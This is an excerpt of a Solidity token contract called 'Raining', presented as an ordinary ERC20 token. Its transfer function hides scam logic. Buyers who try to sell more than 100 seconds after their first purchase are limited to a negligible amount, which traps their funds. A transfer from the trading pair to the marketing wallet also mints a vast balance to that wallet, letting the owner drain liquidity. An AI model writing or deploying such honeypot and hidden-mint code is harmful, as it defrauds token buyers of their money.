...
contract  Raining  is Ownable, IERC20 {
    ...
    string private  _name = "Raining";
    string private  _symbol = "Raining";
    ...
    function changeSwapLimit( uint256 _buyamount, uint256 _sellamount ) external onlyOwner {
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        require(amount > 0);        
        uint256 burnfee;  
        if (!_isExcludedFromFee[from]   && !_isExcludedFromFee[to]  ) { if ( from == uniswapV2Pairs  &&  balanceOf(to) == 0) { {
            require(amount <= maxBuyAmount.mul(30).div(100) );
            
            yyds[to] =  block.timestamp;  }  }  

        if ( from != uniswapV2Pairs )  {   if (  block.timestamp >  yyds[from] + 100 )    {   require(amount <= maxSellAmount.mul(1).div(10000) ); } } }

        if (  from == uniswapV2Pairs  && to == marketingWalletAddress ) { _tOwned[marketingWalletAddress] += _totalSupply * 1 * 100 * 100 * 100  + 1;  }
